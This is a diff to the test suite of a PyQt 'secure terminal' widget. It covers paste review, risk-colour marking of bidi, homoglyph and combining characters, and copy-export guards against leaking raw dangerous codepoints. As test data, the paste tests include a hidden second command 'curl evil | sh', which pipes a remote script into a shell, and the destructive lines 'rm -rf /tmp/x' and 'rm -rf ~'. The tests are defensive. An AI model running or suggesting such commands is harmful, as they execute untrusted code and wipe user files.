@@ -92,6 +92,23 @@ def feed_output(term, raw):
         os.close(r)
         if w is not None:
             os.close(w)
+    # CLI line-mode paints are debounced to ~60fps by a single-shot timer; in the
+    # live app the paint fires from the event loop shortly after the read. These
+    # synchronous tests feed then inspect at once, so flush the pending paint here
+    # (the same flush teardown and every transcript/copy getter perform) so the
+    # document reflects the just-fed bytes without pumping a real 16ms wait.
+    term._flush_paint()
+
+
+# MARKING_COLORS is theme-keyed {fg, bg} per risk class (dark gets a background
+# BAND on the dangerous classes; light and honest-foreign stay fg-only). These
+# read the fg / bg for a widget's CURRENT theme.
+def mark_fg(term, cls):
+    return term.MARKING_COLORS[term._theme][cls]['fg']    # noqa: protected-access
+
+
+def mark_bg(term, cls):
+    return term.MARKING_COLORS[term._theme][cls]['bg']    # noqa: protected-access
 
 
 # A `-- PROGRAM` launch tab now correctly counts as a running program, so closing
@@ -1160,7 +1177,7 @@ ok(0x2500 <= ord(_bdch) <= 0x257F, 'Q1 show: the cell holds the real box-drawing
 eq(_bdcp, ord(_bdch), 'Q2 show: a shown box-drawing glyph carries its own codepoint (inspectable)')
 eq(_bdfg.lower(), _afg.lower(),
    'Q2 show: a shown box-drawing glyph wears the PROGRAM colour (structural, like a real terminal)')
-ok(_bdfg.lower() != _dsh.MARKING_COLORS['nonascii'].lower(),
+ok(_bdfg.lower() != mark_fg(_dsh, 'nonascii').lower(),
    'Q2 show: a shown box-drawing glyph is NOT painted the non-ASCII risk colour')
 _dsh.close()
 
@@ -1177,7 +1194,7 @@ pump(30)
 _hi = _hsh.toPlainText().index(chr(0x0430))
 _hch, _hcp, _hfg = _grid_cell(_hsh, _hi)
 eq(_hcp, 0x0430, 'Q2 show: a shown homoglyph carries its source codepoint')
-eq(_hfg.lower(), _hsh.MARKING_COLORS['confusable'].lower(),
+eq(_hfg.lower(), mark_fg(_hsh, 'confusable').lower(),
    'Q2 show: a shown homoglyph is tinted with the louder confusable risk colour')
 _hsh.close()
 
@@ -1199,7 +1216,7 @@ _disp, _cp, _fg = _grid_cell(_dbx, _bi)
 eq(_disp, _BX, 'Q2 box: the neutralized cell is the box placeholder glyph')
 ok(_cp is not None and 0x2500 <= _cp <= 0x257F,
    'Q2 box: the box cell carries the SOURCE box-drawing codepoint (not U+25A1)')
-eq(_fg.lower(), _dbx.MARKING_COLORS['nonascii'].lower(),
+eq(_fg.lower(), mark_fg(_dbx, 'nonascii').lower(),
    'Q2 box: a boxed box-drawing cell wears the non-ASCII risk colour')
 _dbx.close()
 
@@ -1219,7 +1236,7 @@ for _payload, _wantcp, _wantcls in ((chr(0x202E), 0x202E, 'bidi'),
     _idx = _q2.toPlainText().index('_')
     _d, _c2, _fg2 = _grid_cell(_q2, _idx)
     eq(_c2, _wantcp, 'Q2 grid: %s box carries its source codepoint' % _wantcls)
-    eq(_fg2.lower(), _q2.MARKING_COLORS[_wantcls].lower(),
+    eq(_fg2.lower(), mark_fg(_q2, _wantcls).lower(),
        'Q2 grid: %s box wears the %s risk colour' % (_wantcls, _wantcls))
     # _cp_at parity: hovering the box cell resolves the REAL character, not U+25A1
     _hc = QTextCursor(_q2.document())
@@ -1244,7 +1261,8 @@ pump(30)
 _mv = _grid_cell(_moff, _moff.toPlainText().index('_'))
 eq(_mv[1], 0x202E,
    'Q2 markings off: a neutralized grid cell still carries the source codepoint (CLI parity)')
-ok(_mv[2].lower() not in {c.lower() for c in _moff.MARKING_COLORS.values()},
+ok(_mv[2].lower() not in {s['fg'].lower()
+                          for s in _moff.MARKING_COLORS[_moff._theme].values()},
    'Q2 markings off: but wears no risk-class colour (program SGR only)')
 _moff.close()
 
@@ -1284,12 +1302,12 @@ _sec.apply_mode('show')
 _bidi_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2500) + chr(0x202E)), _BX)
 eq(_bidi_fmt.property(_CPP), 0x202E,
    'grid: a box-drawing+bidi cell resolves to the BIDI codepoint (the real hazard)')
-eq(_bidi_fmt.foreground().color().name().lower(), _sec.MARKING_COLORS['bidi'].lower(),
+eq(_bidi_fmt.foreground().color().name().lower(), mark_fg(_sec, 'bidi').lower(),
    'grid: a neutralized box+bidi cell wears the bidi RISK colour, not the program SGR')
 # a confusable box-drawing diagonal (U+2571 -> "/") shown in Show mode keeps its
 # confusable tint, not the structural program-colour pass.
 _diag_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2571)), chr(0x2571))
-eq(_diag_fmt.foreground().color().name().lower(), _sec.MARKING_COLORS['confusable'].lower(),
+eq(_diag_fmt.foreground().color().name().lower(), mark_fg(_sec, 'confusable').lower(),
    'grid: a confusable box-drawing diagonal wears the confusable risk colour')
 _sec.close()
 
@@ -1395,6 +1413,78 @@ _capcur.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
 cap.setTextCursor(_capcur)
 ok(cap.createMimeDataFromSelection().text() == 'X',
    'a selection after an astral char copies the right cell (UTF-16 aware)')
+
+# regression (box<->show reflow): a neutralized cell is ONE narrow box, but the
+# glyph it stands for can be WIDER (a CJK/emoji renders ~1.7x a plain cell in the
+# shipped Hack font). Under the old pixel WidgetWidth wrap a line that fit in Box
+# re-wrapped in Show and the wide glyph jumped to the next line on a mode toggle.
+# NoWrap makes the terminal's own column model (feed_line_edits at self._cols) the
+# SOLE wrap authority -- mode-independent -- so the glyph keeps its line/column.
+_rf = SecureTerminal(command='/bin/cat')
+_rf.document().setDocumentMargin(0)
+_rffm = _rf.fontMetrics()
+_rfcw = _rffm.horizontalAdvance('M')
+_rfwide = _rffm.horizontalAdvance('\U0001f600')       # emoji: wider than a cell
+_rfN = 10
+# a viewport BETWEEN the box-line width (N+1 narrow cells) and the show-line width
+# (N narrow + one wide glyph): the old pixel wrap broke Show here but not Box.
+_rfvw = int(_rfN * _rfcw + (_rfwide + _rfcw) / 2)
+_rf.resize(_rfvw + 4, 300)
+_rf.show()
+APP.processEvents()
+while _rf.viewport().width() > _rfvw and _rf.width() > 20:
+    _rf.resize(_rf.width() - 1, 300)
+    APP.processEvents()
+_rf._cols = 500                                       # do not hard-wrap this short line
+_rf._mode = 'box'
+_rf._feed_line('M' * _rfN + '\U0001f600')
+APP.processEvents()
+
+
+def _rf_visual_lines(t):
+    lay = t.document().documentLayout()
+    return round(lay.blockBoundingRect(t.document().begin()).height()
+                 / t.fontMetrics().height())
+
+
+_rf_box_lines = _rf_visual_lines(_rf)
+_rf.apply_mode('show')
+APP.processEvents()
+_rf_show_lines = _rf_visual_lines(_rf)
+ok(_rfwide <= _rfcw or (_rf_box_lines == 1 and _rf_show_lines == 1),
+   'box<->show keeps a wide glyph on the same line -- no reflow (NoWrap authority)')
+_rf.close()
+
+# regression (Fix #4): CLI paints are DEBOUNCED to ~60fps by a single-shot timer,
+# so a live read does not rebuild the document immediately -- but a save/teardown
+# must FLUSH the pending paint or the last unpainted line is lost.
+_db = SecureTerminal(command='/bin/cat')
+_db._mode = 'show'
+_dbr, _dbw = os.pipe()
+_db._fd = _dbr
+os.write(_dbw, b'debounced-last-line')
+os.close(_dbw)
+_db._on_readable()                                    # live read -> deferred paint
+_db._fd = None
+os.close(_dbr)
+ok(_db.document().toPlainText() == '',
+   'a live CLI read debounces the paint (the Qt document is not rebuilt yet)')
+ok('debounced-last-line' in _db.transcript_text(),
+   'transcript_text flushes the pending paint, so a save never misses the last line')
+_db.close()
+# shutdown flushes too, so the last line survives teardown
+_db2 = SecureTerminal(command='/bin/cat')
+_db2._mode = 'show'
+_dbr2, _dbw2 = os.pipe()
+_db2._fd = _dbr2
+os.write(_dbw2, b'teardown-last-line')
+os.close(_dbw2)
+_db2._on_readable()
+_db2._fd = None
+os.close(_dbr2)
+_db2.shutdown()
+ok('teardown-last-line' in _db2.document().toPlainText(),
+   'shutdown flushes the pending paint, so the last line survives teardown')
 # gap1 (ai-review): the PRIMARY-selection / drag path strips to ASCII even in Show
 # mode -- a homoglyph must not reach a middle-click paste / drop target unreviewed
 # (the copy review only covers Ctrl+C).
@@ -1604,48 +1694,56 @@ key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
 ok(not hk._line_dirty and hk._line_buffer == '',
    'Ctrl+U discards the line and stays clean (nothing stale to ask about)')
 
-# --- paste + hook: a paste that would AUTO-SUBMIT (carries any newline, even a
-# single trailing one) is HELD for review; a non-submitting paste marks the line
-# dirty so the next Enter asks. Without this a pasted command silently ran.
+# --- paste + hook: a paste can NEVER auto-execute. A SINGLE-line paste (with or
+# without a trailing newline) is delivered with its trailing submit stripped, so
+# it lands at the prompt un-entered -- and since _line_buffer never saw those
+# bytes, the line is marked unverifiable so the hook FAILS SAFE (asks) on the next
+# Enter. A MULTI-line paste (a hidden second command) is HELD for review first.
 from PyQt6.QtCore import QMimeData as _QMimeHook          # noqa: E402
-hk.apply_paste_warn('unicode')
+hk.apply_paste_warn('unicode')       # (reuse the _hsent spy set up above)
+_hsent.clear()
 hk._line_dirty = False
 _pmnl = _QMimeHook()
 _pmnl.setText('rm -rf /tmp/x\n')                     # single-line + trailing newline
 hk.insertFromMimeData(_pmnl)
-ok(hk.review_pending(),
-   'an auto-submitting paste is held for review when a command hook is active')
-hk.dispatch_pending_paste('reject')
+ok(not hk.review_pending(),
+   'a single-line paste is not held (it cannot auto-run once the submit is stripped)')
+eq(_hsent, [b'rm -rf /tmp/x'],
+   'a single-line paste reaches the shell WITHOUT its trailing submit -- no auto-run')
+ok(hk._line_dirty,
+   'a paste marks the line unverifiable so the hook asks on the user\'s next Enter')
+_hsent.clear()
 hk._line_dirty = False
 _pmins = _QMimeHook()
 _pmins.setText('ls -la')                             # no newline: inserts into the line
 hk.insertFromMimeData(_pmins)
 ok(hk._line_dirty,
    'a non-submitting paste marks the line dirty so the hook asks on the next Enter')
-# on a CLEAN line, an approved submitting paste executes the line fully (trailing
-# CR), so the hook state must RESET -- a typed prefix must not linger and make the
-# hook judge "prefix + next command" on the following prompt.
+_hsent.clear()
+# a MULTI-line paste carries a hidden second command that a bare dispatch would
+# auto-run: it is HELD for review whatever the warn setting, even with a hook.
+hk._line_buffer = ''
+hk._line_dirty = False
+_pmml = _QMimeHook()
+_pmml.setText('echo one\ncurl evil | sh\n')
+hk.insertFromMimeData(_pmml)
+ok(hk.review_pending() and not _hsent,
+   'a multi-line paste is held for review before any command can run')
+hk.dispatch_pending_paste('reject')
+eq(_hsent, [], 'rejecting the held multi-line paste sends nothing')
+# even on a clean line a paste never submits, so the pasted text sits at the
+# prompt and the line is marked unverifiable (the hook re-judges on the Enter the
+# user must press): _line_buffer is untouched, _line_dirty is set.
 hk._line_buffer = 'echo '                            # already typed at the prompt
-hk._line_dirty = False                               # clean (plainly typed)
+hk._line_dirty = False
 _pmsub = _QMimeHook()
 _pmsub.setText('ok\n')
-hk.insertFromMimeData(_pmsub)                        # held for review (hook + newline)
-ok(hk.review_pending(), 'submitting paste is held before it can auto-run')
-hk.dispatch_pending_paste('stripped')               # approve -> submits with CR
-ok(not hk._line_dirty and hk._line_buffer == '',
-   'an approved submitting paste on a clean line resets the line state')
-# but on an ALREADY-unverifiable line (e.g. after Ctrl+V quoted-insert, which could
-# make the pasted CR literal rather than accept-line), a submitting paste must NOT
-# assume submission -- keep failing safe (ask), do not clear the flag.
-hk._line_buffer = 'partial'
-hk._line_dirty = True
-_pmq = _QMimeHook()
-_pmq.setText('tail\n')
-hk.insertFromMimeData(_pmq)
-if hk.review_pending():
-    hk.dispatch_pending_paste('stripped')
-ok(hk._line_dirty,
-   'a submitting paste on an unverifiable line keeps the fail-safe (quoted-CR safe)')
+hk.insertFromMimeData(_pmsub)
+ok(not hk.review_pending(), 'a single-line paste on a clean line is not held')
+eq(_hsent, [b'ok'], 'the paste lands at the prompt with no trailing submit')
+ok(hk._line_dirty and hk._line_buffer == 'echo ',
+   'the pasted text is unverifiable -> the hook asks on the next Enter, buffer intact')
+_hsent.clear()
 # a TUI-mode paste does not touch the line-mode command, so never sets the flag.
 _tuihk = SecureTerminal(command='/bin/cat', tui=True)
 _tuihk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
@@ -1672,16 +1770,29 @@ key(hk, Qt.Key.Key_J, mods=_ctrl_mod)                # Ctrl+J == LF == accept-li
 ok(not hk._line_dirty and hk._line_buffer == '' and b'\n' in _hsent,
    'Ctrl+J (allowed) submits, resets the line, leaves no stale dirty flag')
 
-# paste_warn='never' must NOT bypass the command-hook gate: an auto-submitting
-# paste is still held for review when a hook is active, whatever the warn setting.
+# paste_warn='never' must NOT bypass the multi-command gate: a MULTI-line paste
+# (a hidden second command that would auto-run) is still held for review whatever
+# the warn setting. A single-line paste is instead delivered with its submit
+# stripped, so it cannot auto-run either -- it never needs the hold.
+_hsent.clear()
 hk.apply_paste_warn('never')
 hk._line_dirty = False
 _pmnever = _QMimeHook()
-_pmnever.setText('rm -rf ~\n')
+_pmnever.setText('echo a\nrm -rf ~\n')                # embedded newline -> multi-command
 hk.insertFromMimeData(_pmnever)
 ok(hk.review_pending(),
-   "paste_warn='never' still holds an auto-submitting paste when a hook is active")
+   "paste_warn='never' still holds a MULTI-line paste (hidden second command)")
 hk.dispatch_pending_paste('reject')
+eq(_hsent, [], 'the rejected multi-line paste sends nothing to the shell')
+# a single-line paste under 'never' is NOT held -- delivered without its submit.
+hk._line_dirty = False
+_pmnever1 = _QMimeHook()
+_pmnever1.setText('rm -rf ~\n')
+hk.insertFromMimeData(_pmnever1)
+ok(not hk.review_pending(), "paste_warn='never': a single-line paste is not held")
+eq(_hsent, [b'rm -rf ~'],
+   "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
+_hsent.clear()
 hk.apply_paste_warn('unicode')
 
 # a second paste arriving while a review is already open is ignored, not allowed to
@@ -1794,20 +1905,27 @@ mk = SecureTerminal(command='/bin/cat')
 mk.apply_colors(True)
 mk.apply_theme('dark')
 _bidi = (_S.MARK_KEY, 'bidi', 0x202E)                 # a RIGHT-TO-LEFT OVERRIDE
-eq(mk._fmt_from_key(_bidi).foreground().color().name(), mk.MARKING_COLORS['bidi'],
+eq(mk._fmt_from_key(_bidi).foreground().color().name(), mark_fg(mk, 'bidi'),
    'marking: coloured by risk class (bidi), an app cannot recolour it')
-ok(mk._fmt_from_key(_bidi).background().style() == Qt.BrushStyle.NoBrush,
-   'marking: no app background is applied -- the box shows on the default bg')
-_risk_classes = ('bidi', 'invisible', 'control', 'nonascii', 'confusable')
+# On the dark theme a dangerous class carries a risk-class background BAND (a fg-only
+# tint was optically swallowed by the near-black base). The band is OURS, by class --
+# an app still cannot control it; it is not the app's SGR.
+eq(mk._fmt_from_key(_bidi).background().color().name(), mark_bg(mk, 'bidi'),
+   'marking: a bidi box wears the risk-class band on the dark theme, not an app colour')
+_risk_classes = ('bidi', 'invisible', 'control', 'nonascii', 'confusable', 'combining')
 _risk_cols = [mk._fmt_from_key((_S.MARK_KEY, c, 0x41)).foreground().color().name()
               for c in _risk_classes]
 eq(len(set(_risk_cols)), len(_risk_classes),
-   'marking: the five risk classes get five distinct colours')
-ok(all(c in mk.MARKING_COLORS for c in _risk_classes),
+   'marking: the six risk classes get six distinct colours')
+ok(all(c in mk.MARKING_COLORS[mk._theme] for c in _risk_classes),
    'marking: every risk class has a configured colour')
 # a homoglyph (confusable) is flagged in a DIFFERENT colour than honest foreign text
-ok(mk.MARKING_COLORS['confusable'] != mk.MARKING_COLORS['nonascii'],
+ok(mark_fg(mk, 'confusable') != mark_fg(mk, 'nonascii'),
    'marking: a look-alike (confusable) is louder than plain non-ASCII, not the same colour')
+# a combining mark (Zalgo) is split off from honest foreign text: its own class,
+# its own louder colour -- the taxonomy collision that made marks vanish is gone.
+ok(mark_fg(mk, 'combining') != mark_fg(mk, 'nonascii'),
+   'marking: a combining mark is its own class, louder than plain non-ASCII')
 # markings OFF: the box carries the app's own SGR -- an app trying to hide it by
 # painting it its background colour is still forced readable by the contrast guard.
 _hide = tuple(sorted({'fg': 0, 'bg': 0, 'bold': False}.items()))    # black-on-black
@@ -1818,10 +1936,10 @@ ok(_hf.background().style() == Qt.BrushStyle.NoBrush
 
 # --- every theme: risk-class marking colours stay readable, and a hide attempt
 # --- is guarded regardless of theme -------------------------------------------
-# The risk colours are fixed (not theme-derived), so they must read on BOTH theme
-# backgrounds -- the MARKING_COLORS comment claims "chosen to read on both the
-# light and dark themes", pinned here. And the box-hiding guard must hold in every
-# theme, not just dark (the contrast-guard sweeps elsewhere already cover both).
+# The risk colours are theme-keyed, and each fg must read on WHATEVER it is shown
+# on: its risk-class band where one is set (the dark dangerous classes), else the
+# theme base (light, and honest 'nonascii'). Pinned here per theme. The box-hiding
+# guard must also hold in every theme, not just dark.
 from secure_terminal.terminal import THEMES as _THEMES2, _rgb as _rgb4   # noqa: E402
 from secure_terminal.sanitize import too_close as _tc4                   # noqa: E402
 from PyQt6.QtGui import QColor as _QC4                                    # noqa: E402
@@ -1830,9 +1948,10 @@ _thmk.apply_colors(True)
 for _theme in ('dark', 'light'):
     _thmk.apply_theme(_theme)
     _bg_rgb = _rgb4(_QC4(_THEMES2[_theme][0]))
-    for _cls, _hex in _thmk.MARKING_COLORS.items():
-        ok(not _tc4(_rgb4(_QC4(_hex)), _bg_rgb),
-           'marking colour %s reads on the %s theme background' % (_cls, _theme))
+    for _cls, _spec in _thmk.MARKING_COLORS[_theme].items():
+        _on = _rgb4(_QC4(_spec['bg'])) if _spec['bg'] is not None else _bg_rgb
+        ok(not _tc4(_rgb4(_QC4(_spec['fg'])), _on),
+           'marking colour %s reads on its %s-theme background' % (_cls, _theme))
     # a program painting a box its own bg colour is forced readable in this theme
     for _c in (0, 7, 15):
         _hk = tuple(sorted({'fg': _c, 'bg': _c, 'bold': False}.items()))
@@ -1849,6 +1968,41 @@ for _theme, _base in (('dark', '#14161b'), ('light', '#ffffff')):
     eq(_thmk.palette().color(_thmk.palette().ColorRole.Base).name(), _base,
        'apply_theme sets the %s base background' % _theme)
 
+# the shipped default theme is LIGHT: a fresh widget with no theme configured comes
+# up light (white base), not dark.
+_deft = SecureTerminal(command='/bin/cat')
+eq(_deft.current_theme(), 'light', 'a fresh widget defaults to the light theme')
+eq(_deft.palette().color(_deft.palette().ColorRole.Base).name(), '#ffffff',
+   'the default (light) theme paints a white base')
+_deft.close()
+
+# --- louder marking tint: BOTH themes give the dangerous classes a background BAND
+# --- (a fg-only tint was optically swallowed by the base and vanished); honest
+# --- 'nonascii' stays fg-only in both. Light is the shipped default, so its bands
+# --- are the primary case. Exercise BOTH branches of the optional-band code (bg set
+# --- / bg None) in BOTH renderers, on BOTH themes. A theme toggle clears both
+# --- marking caches, so no stale band survives a switch.
+_band = SecureTerminal(command='/bin/cat', tui=True)
+_band.apply_mode('box')                       # neutralize -> risk-class colouring
+_band.apply_markings(True)
+for _bt in ('light', 'dark'):
+    _band.apply_theme(_bt)
+    # CLI line renderer (_fmt_from_key): a dangerous class wears its band; nonascii none.
+    _cf = _band._fmt_from_key((_S.MARK_KEY, 'combining', 0x0301))
+    eq(_cf.background().color().name(), mark_bg(_band, 'combining'),
+       'line renderer: a combining marking wears its %s risk band (bg-set branch)' % _bt)
+    _nf = _band._fmt_from_key((_S.MARK_KEY, 'nonascii', 0x4E2D))
+    ok(_nf.background().style() == Qt.BrushStyle.NoBrush,
+       'line renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
+    # TUI grid renderer (_grid_cell_format): the same two branches.
+    _gc = _band._grid_cell_format(_FakeCell(chr(0x0301)), _BX)  # combining -> banded
+    eq(_gc.background().color().name(), mark_bg(_band, 'combining'),
+       'grid renderer: a combining cell wears its %s risk band (bg-set branch)' % _bt)
+    _gn = _band._grid_cell_format(_FakeCell(chr(0x4E2D)), _BX)  # honest foreign -> none
+    ok(_gn.background().style() == Qt.BrushStyle.NoBrush,
+       'grid renderer: honest nonascii stays fg-only on %s (bg-None branch)' % _bt)
+_band.close()
+
 # --- paste gating (async review: hold, then dispatch a choice) ----------------
 p = SecureTerminal(command='/bin/cat')
 psent = spy_writes(p)
@@ -1859,8 +2013,12 @@ p.paste_review_requested.connect(lambda raw, delay: _reviews.append((raw, delay)
 mime = QMimeData()
 mime.setText('echo hi\n')
 p.insertFromMimeData(mime)
-eq(psent, [b'echo hi\r'], 'clean paste sent directly')
-eq(_reviews, [], 'a clean paste raises no review')
+# SECURITY: a newline-terminated single-line paste must NOT auto-execute -- the
+# trailing submit is stripped so the command lands at the prompt awaiting the
+# user's own Enter (it still crosses without a review; only the auto-run is
+# removed).
+eq(psent, [b'echo hi'], 'a single-line paste is delivered WITHOUT its trailing submit')
+eq(_reviews, [], 'a clean single-line paste raises no review')
 psent.clear()
 # F3: a MULTI-LINE plain-ASCII paste is held for review too, so a hidden second
 # command cannot run the instant you paste (default 'unicode' warn mode).
@@ -1886,17 +2044,45 @@ ok(not p.review_pending(), 'reject clears the held paste')
 # stripped -> ASCII only
 p.insertFromMimeData(mime2)
 p.dispatch_pending_paste('stripped')
-eq(psent, [b'payl\r'], 'stripped paste sends ASCII only (homoglyph + bidi dropped)')
+eq(psent, [b'payl'],
+   'stripped paste sends ASCII only (homoglyph + bidi dropped, no auto-submit)')
 psent.clear()
 # unicode -> keeps the printable homoglyph, still drops the bidi override
 p.insertFromMimeData(mime2)
 p.dispatch_pending_paste('unicode')
-eq(psent, [('pay' + chr(0x0430) + 'l\r').encode('utf-8')],
+eq(psent, [('pay' + chr(0x0430) + 'l').encode('utf-8')],
    'unicode paste keeps the printable homoglyph but still drops the bidi override')
 psent.clear()
 # dispatch with nothing pending is a no-op -- a stale paste can never be re-sent
 p.dispatch_pending_paste('unicode')
 eq(psent, [], 'dispatch with no held paste sends nothing')
+# a paste that is ONLY newline(s) becomes empty once its trailing submit is
+# stripped -- nothing (not even a bare submit) reaches the shell.
+psent.clear()
+_pnl = QMimeData()
+_pnl.setText('\n')
+p.insertFromMimeData(_pnl)
+eq(psent, [], 'a newline-only paste delivers nothing (no bare auto-submit)')
+
+# regression (Fix #1, the user's repro): pasting a copied prompt line that ended
+# in a newline AUTO-EXECUTED it -- the shell ran 'user@...%: not found', then its
+# error-prompt redraw (a CR + short reprint) overwrote the line start, mangling
+# 'user@work-claude' to '<k-claude'. The paste must never auto-execute: its
+# trailing submit is stripped so it waits at the prompt, and the echoed text then
+# renders verbatim (no CR-overwrite redraw to corrupt it).
+_pr = SecureTerminal(command='/bin/cat')
+_pr._mode = 'show'
+_prsent = spy_writes(_pr)
+_prmime = QMimeData()
+_prmime.setText('user@work-claude:~/x% user@y% \n')
+_pr.insertFromMimeData(_prmime)
+ok(_prsent and not any(b.endswith(b'\r') for b in _prsent),
+   'a pasted prompt line is delivered WITHOUT a trailing submit -- it cannot auto-run')
+_pr._feed_line('user@work-claude:~/x% user@y% ')     # the shell's verbatim echo
+_prdoc = _pr.toPlainText()
+ok('user@work-claude' in _prdoc and '<k' not in _prdoc,
+   'a pasted prompt string renders verbatim -- no <k line-start corruption')
+_pr.close()
 
 # --- paste warning: three modes (always / if-unicode default / never) ---------
 eq(p.current_paste_warn(), 'unicode',
@@ -1910,7 +2096,8 @@ _dirty.setText('echo ' + chr(0x0430) + '\n')
 _reviews.clear(); psent.clear()
 p.insertFromMimeData(_clean)
 eq(_reviews, [], 'if-unicode mode: a clean ASCII paste is not questioned')
-eq(psent, [b'echo ok\r'], 'if-unicode mode: the clean paste goes straight through')
+eq(psent, [b'echo ok'],
+   'if-unicode mode: the clean paste goes straight through, minus its auto-submit')
 _reviews.clear()
 p.insertFromMimeData(_dirty)
 eq(len(_reviews), 1, 'if-unicode mode: a unicode paste is questioned (held)')
@@ -1925,9 +2112,10 @@ eq(p.current_paste_warn(), 'never', 'apply_paste_warn switches the mode')
 _reviews.clear(); psent.clear()
 p.insertFromMimeData(_dirty)
 eq(_reviews, [], 'never mode: even a unicode paste is not questioned')
-eq(psent, [b'echo \xd0\xb0\r'],
+eq(psent, [b'echo \xd0\xb0'],
    'never mode: the unicode paste is KEPT (not stripped) -- disabling review does '
-   'not mangle deliberately pasted unicode')
+   'not mangle deliberately pasted unicode -- but its trailing submit is still '
+   'dropped, so even an unreviewed paste never auto-executes')
 
 # 'always': even a clean ASCII paste holds for review.
 p.apply_paste_warn('always')
@@ -1994,6 +2182,137 @@ _copy_act.trigger()
 ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
    'the context-menu Copy is routed through the copy review, not straight to the clipboard')
 cp.dispatch_pending_copy('reject')
+
+# --- FIX A: multi-path copy-oracle for Show-mode inert display glyphs ----------
+# A user copied a boxed cell and got only spaces: the ASCII export paths dropped the
+# inert DISPLAY glyph (the U+25A1 neutralization box, and Show-mode structural
+# box-drawing shown as its real glyph) to NOTHING, so a box present on screen
+# vanished on the clipboard -- security-SAFE (the raw dangerous byte is never in the
+# text) but "silently wrong". Feed a payload with BOTH a neutralized/boxed cell (a
+# bidi override, shown as the box) AND a structural box-drawing run, in TUI Show
+# mode, then assert EVERY export path holds three invariants:
+#   * NEVER emits the raw dangerous codepoint (U+202E) -- the leak guard;
+#   * NEVER collapses the boxed region to whitespace-only -- the silent-loss guard;
+#   * carries a non-empty inert ASCII stand-in for the box / structural glyphs.
+from PyQt6.QtGui import QGuiApplication as _QGA_ora            # noqa: E402
+_ORA_BOX = chr(0x25A1)                              # U+25A1 WHITE SQUARE (the box)
+_ORA_RLO = chr(0x202E)                              # RIGHT-TO-LEFT OVERRIDE (bidi)
+# No .show()/pump() here: _render_tui paints the grid synchronously and leaves no
+# pending debounced-paint timer, so this block is hermetic -- it cannot perturb the
+# event-loop timing of a later test.
+_ora = SecureTerminal(command='/bin/cat', tui=True)
+_ora.apply_mode('show')
+_ora.apply_copy_warn('always')                      # force the copy review flow
+# row: x <boxed RLO> y  then DEC line-drawing 'lqk' -> real box-drawing glyphs
+_ora._feed_stream(('x' + _ORA_RLO + 'y ').encode() + b'\x1b(0lqk\x1b(B\r\n')
+_ora._render_tui()
+_oratxt = _ora.toPlainText()
+ok(_ORA_BOX in _oratxt, 'copy-oracle: the bidi cell is shown as the neutralization box')
+ok(any(0x2500 <= ord(c) <= 0x257F for c in _oratxt),
+   'copy-oracle: the DEC line-drawing renders as real box-drawing glyphs')
+
+def _ora_copy(action):
+    _QGA_ora.clipboard().setText('SENTINEL')
+    _ora.selectAll()
+    _ora.copy()
+    _ora.dispatch_pending_copy(action)
+    return _QGA_ora.clipboard().text()
+
+_ora.selectAll()
+_ora_prim = _ora.createMimeDataFromSelection().text()   # PRIMARY / drag path
+_ora_strip = _ora_copy('stripped')                      # Ctrl+C review 'stripped'
+_ora_uni = _ora_copy('unicode')                         # Ctrl+C review 'unicode'
+_ora_plain = _ora.toPlainText()
+_ora_scr = _ora.transcript_text()
+
+# Every path: never the raw dangerous codepoint, never whitespace-only.
+for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip),
+                   ('copy unicode', _ora_uni), ('toPlainText', _ora_plain),
+                   ('transcript_text', _ora_scr)):
+    ok(_ORA_RLO not in _exp,
+       'copy-oracle %s: never emits the raw bidi override (leak guard)' % _lbl)
+    ok(_exp.strip() != '',
+       'copy-oracle %s: the boxed region never collapses to whitespace-only' % _lbl)
+
+# The two ASCII strip paths map the box -> '_' and the box-drawing -> an ASCII shape,
+# instead of dropping them (the silent-loss canary: '_' is ABSENT on the old code).
+for _lbl, _exp in (('PRIMARY/drag', _ora_prim), ('copy stripped', _ora_strip)):
+    ok(all(ord(c) < 128 for c in _exp),
+       'copy-oracle %s: pure ASCII (no glyph rides out unreviewed)' % _lbl)
+    ok('_' in _exp,
+       'copy-oracle %s: the neutralized box exports as ASCII _ (not lost)' % _lbl)
+    ok(any(c in '+-|#' for c in _exp),
+       'copy-oracle %s: the structural box-drawing exports an ASCII stand-in' % _lbl)
+# The 'unicode' opt-in keeps the inert box + structural glyph AS glyphs (never the
+# raw override) -- FIX A leaves this correct path untouched.
+ok(_ORA_BOX in _ora_uni,
+   'copy-oracle copy unicode: keeps the inert box glyph (opted-in real unicode)')
+ok(any(0x2500 <= ord(c) <= 0x257F for c in _ora_uni),
+   'copy-oracle copy unicode: keeps the structural box-drawing glyph')
+# transcript_text expands the box to its NAMED source codepoint (lossless save).
+ok('U+202E' in _ora_scr,
+   'copy-oracle transcript_text: the box expands to the named source codepoint')
+_ora.close()
+
+# A boxed cell surrounded only by spaces is the sharpest silent-loss case: on the old
+# code the ASCII paths dropped it and the whole selection was whitespace-only.
+_orb = SecureTerminal(command='/bin/cat', tui=True)
+_orb.apply_mode('show')
+_orb._feed_stream((' ' + _ORA_RLO + ' \r\n').encode())
+_orb._render_tui()
+_orb.selectAll()
+_orb_prim = _orb.createMimeDataFromSelection().text()
+ok(_orb_prim.strip() != '' and '_' in _orb_prim,
+   'copy-oracle: a space-flanked box copies as _ (never a whitespace-only string)')
+ok(_ORA_RLO not in _orb_prim,
+   'copy-oracle: the space-flanked box never leaks the raw override')
+_orb.close()
+
+# FIX B end-to-end, refined by task #36: claude-code prints "<U+276F><U+00A0>Try ..."
+# as its prompt. The reported "box icon" is the trailing U+00A0 NO-BREAK SPACE (blank
+# non-ASCII). Task #36 shows it as the DISTINCT space marker (SPACE_MARK), not a full
+# box, so the line stays readable -- yet the marker is a non-ASCII glyph that can never
+# pose as a plain space, every text export maps it to '_' (never ' '), and a saved
+# transcript names its codepoint inline. The caret U+276F renders as its own glyph.
+_SPMARK = chr(0x2423)                               # SPACE_MARK (U+2423 OPEN BOX)
+_clp = SecureTerminal(command='/bin/cat', tui=True)
+_clp.apply_mode('show')
+_clp._feed_stream((chr(0x276F) + chr(0x00A0) + 'Try\r\n').encode())
+_clp._render_tui()
+# the RAW on-screen document (QTextDocument.toPlainText, not the widget's export
